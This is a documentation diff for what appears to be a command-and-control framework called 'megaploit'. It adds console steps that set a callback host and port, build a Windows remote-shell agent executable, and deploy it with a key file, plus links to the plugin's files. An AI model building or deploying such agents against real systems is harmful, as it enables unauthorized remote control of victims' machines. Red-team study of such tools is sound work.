@@ -668,10 +668,15 @@ The runner auto-detects the first available compiler. No configuration needed.
 Required linker libraries:
 `Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib  Advapi32.lib  User32.lib`
 
-Build via the C2 console:
+Build via the C2 console using the bundled plugin:
 
 ```
-megaploit> generate_c 10.0.0.1 4444
+megaploit [0] » set lhost 10.0.0.1
+megaploit [0] » set port 4444
+megaploit [0] » crs_build
+# [*] Using MinGW: x86_64-w64-mingw32-gcc
+# [+] Build OK → C-remote-shell/megaploit_c_agent.exe
+# [*] Drop 'secret.key' alongside the EXE before deploying.
 ```
 
 Or manually with the Makefile:
@@ -684,6 +689,8 @@ make C2_IP=10.0.0.1 C2_PORT=4444
 ---
 
 *See also:*
+- [`plugins/c_remote_shell.toml`](../plugins/c_remote_shell.toml) — C-remote-shell plugin descriptor
+- [`plugins/c_remote_shell.py`](../plugins/c_remote_shell.py) — C-remote-shell plugin Python handlers
 - [`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h) — single-header protocol library
 - [`plugins/native_sdk/example_plugin.cpp`](../plugins/native_sdk/example_plugin.cpp) — working native plugin example
 - [`plugins/native_sdk/example_native.toml`](../plugins/native_sdk/example_native.toml) — plugin descriptor for the example
